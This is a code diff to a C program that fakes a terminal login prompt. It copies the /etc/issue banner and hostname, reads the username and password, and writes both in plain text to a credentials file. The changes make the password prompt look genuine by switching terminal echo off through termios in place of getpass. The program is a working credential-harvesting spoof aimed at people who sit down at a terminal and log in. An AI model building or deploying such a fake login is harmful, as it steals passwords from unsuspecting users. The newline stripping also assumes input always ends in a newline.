@@ -6,6 +6,7 @@
 #include<fcntl.h>
 #include<time.h>
 #include<sys/utsname.h>
+#include<termios.h>
 
 #define MAX_INPUT_LENGTH 32
 #define MAX_HOSTNAME_LENGTH 64
@@ -14,9 +15,7 @@
 char host[MAX_HOSTNAME_LENGTH];
 char* tty;
 
-
-
-/*
+/**
  * prints special characters from /etc/issue
  * taken from github.com/ystk/debian-mingetty
  * slightly modified
@@ -77,8 +76,7 @@ static void output_special_char (unsigned char c)
   }
 }
 
-
-/*
+/**
  * reads /etc/issue and prints the banner
  */
 void print_banner()
@@ -105,8 +103,6 @@ void print_banner()
   }
 }
 
-
-
 /**
  * gets user's credentials and stores them into the specified file
  *
@@ -121,11 +117,12 @@ void print_banner()
  */
 int get_credentials(char* filepath)
 {
-  char *pass = NULL;
+  char pass[MAX_INPUT_LENGTH];
   char user[MAX_INPUT_LENGTH];
   char timestamp[32];
   int fd = 0;
-  
+  struct termios oflags, nflags;
+
   // open file to log credentials
   if (filepath == NULL)
     filepath = "./credentials";
@@ -138,7 +135,6 @@ int get_credentials(char* filepath)
       return -1;
     }
 
-  // pass issue file to print_banner
   print_banner();
 
   printf("%s login: ",host);
@@ -168,13 +164,33 @@ int get_credentials(char* filepath)
   // getting and logging credentials
   write(fd, "login: ", strlen("login: ")+1);
   write(fd, (const void *)user, strlen(user)+1);
-  // TODO: getpass is deprecated, remove in the future
-  pass = getpass("Password: ");
+
+  // disable output
+  tcgetattr(fileno(stdin), &oflags);
+  nflags = oflags;
+  nflags.c_lflag &= ~ECHO;
+  nflags.c_lflag |= ECHONL;
+
+  if (tcsetattr(fileno(stdin), TCSANOW, &nflags) != 0) {
+    perror("tcsetattr");
+    return EXIT_FAILURE;
+  }
+  
+  // get password
+  printf("Password: ");
+  fgets(pass, sizeof(pass), stdin);
+  pass[strlen(pass) - 1] = 0;
+
+  // restore output
+  if (tcsetattr(fileno(stdin), TCSANOW, &oflags) != 0) {
+    perror("tcsetattr");
+    return EXIT_FAILURE;
+  }
+
   write(fd, "pass: ", strlen("pass: ")+1);
   write(fd, (const void *)pass, strlen(pass)+1);
   write(fd, "\n\n", 2);
   
-  free(pass);
   close(fd);
   return 0;
 }
